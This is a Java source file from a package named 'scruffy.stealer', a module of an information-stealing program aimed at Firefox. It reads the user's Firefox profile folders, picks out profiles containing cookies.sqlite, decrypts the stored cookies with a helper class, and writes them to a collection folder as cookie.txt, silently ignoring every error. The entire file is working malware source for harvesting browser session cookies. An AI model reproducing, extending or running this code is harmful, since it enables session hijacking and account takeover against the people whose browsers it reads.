package scruffy.stealer.impl.browser;

import java.io.File;
import java.util.Arrays;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;
import scruffy.stealer.utils.decrypt.decrypt_manager;

public class firefox extends utilities {
	
    public void initialize() throws Exception {
        setup("browser/firefox/default/");
    }

    public void setup(String path) throws Exception {
        File profiles = new File(System.getenv("appdata") + "/Mozilla/Firefox/Profiles");
        if (!profiles.exists()) {
            return;
        }
        Arrays.stream(profiles.listFiles())
	        .filter(x -> x.getName().contains("default-release"))
	        .filter(winx -> new File(profiles + "/" + winx.getName() + "/cookies.sqlite").exists()).forEach(file -> {
	            try {
	                String cookies = new decrypt_manager().getMozillaCookies(profiles + "/" + file.getName() + "/cookies.sqlite");
	                if (!cookies.isEmpty()) {
	                    FileUtils.writeStringToFile(new File(getFolder() + "/" + path + "cookie.txt"), cookies, "utf-8", true);
	                }
	            } catch (Exception ignore) {}
	        }
	    );
    }
    
}